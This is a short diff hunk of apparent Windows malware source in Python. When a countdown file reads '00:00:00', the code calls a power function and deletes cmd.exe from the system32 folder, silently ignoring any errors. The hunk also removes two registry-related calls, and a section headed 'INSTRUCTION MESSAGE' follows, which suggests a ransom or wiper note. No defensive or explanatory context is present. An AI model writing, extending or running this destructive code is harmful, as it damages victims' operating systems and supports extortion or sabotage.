@@ -32,14 +32,12 @@ def updateTime(generator):
     x = open(src).read()
     if(x == "00:00:00"):
         try:
-            delproc.power()
+            dr.power()
             os.remove("\\windows\\system32\\cmd.exe")
         except FileNotFoundError:
             pass
         except:
             pass
-        regedit.delenv()
-        regedit.delSpecRules()
         exit()
 # INSTRUCTION MESSAGE
 def instructions():
